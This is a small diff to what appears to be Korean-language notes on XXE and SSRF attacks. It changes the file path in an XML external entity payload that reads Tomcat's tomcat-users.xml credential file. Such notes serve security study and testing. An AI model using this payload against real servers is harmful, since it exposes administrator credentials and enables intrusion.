@@ -66,7 +66,7 @@ SSRF:
 Tomcat 설정 읽기:
 &lt;?xml version="1.0"?&gt;
 &lt;!DOCTYPE foo [
-  &lt;!ENTITY xxe SYSTEM "file:///home/yuyu/tomcat/conf/tomcat-users.xml"&gt;
+  &lt;!ENTITY xxe SYSTEM "file:///opt/tomcat/conf/tomcat-users.xml"&gt;
 ]&gt;
 &lt;data&gt;&amp;xxe;&lt;/data&gt;
 </pre>
